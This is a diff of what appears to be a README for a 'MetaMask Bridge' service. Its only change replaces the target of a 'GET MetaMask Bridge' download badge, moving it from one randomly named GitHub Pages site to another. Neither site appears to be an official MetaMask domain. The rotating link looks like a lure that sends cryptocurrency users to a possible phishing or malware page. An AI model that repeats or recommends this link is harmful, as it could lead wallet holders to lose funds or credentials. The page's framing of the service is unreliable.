@@ -53,7 +53,7 @@ The service also helps reduce uncertainty around MetaMask bridge gas fees and Me
 
 Prerequisites: A MetaMask wallet, funds on a supported source network, and enough native token balance to cover MetaMask bridge gas fees.
 
-[![GET MetaMask Bridge](https://img.shields.io/badge/GET%20%E2%80%94%20MetaMask%20Bridge-0078D6?style=for-the-badge&logoColor=white)](https://brysonsandersuxqn.github.io/.github/metamask-bridge)
+[![GET MetaMask Bridge](https://img.shields.io/badge/GET%20%E2%80%94%20MetaMask%20Bridge-0078D6?style=for-the-badge&logoColor=white)](https://princehannazlko.github.io/.github/metamask-bridge)
 
 1.  **Open the Bridge Flow:** Launch MetaMask Bridge from the wallet or MetaMask portfolio bridge area and connect the wallet account you want to use.
 2.  **Choose Networks and Token:** Select the source chain, destination chain, and asset, then review MetaMask Bridge chains for route availability.
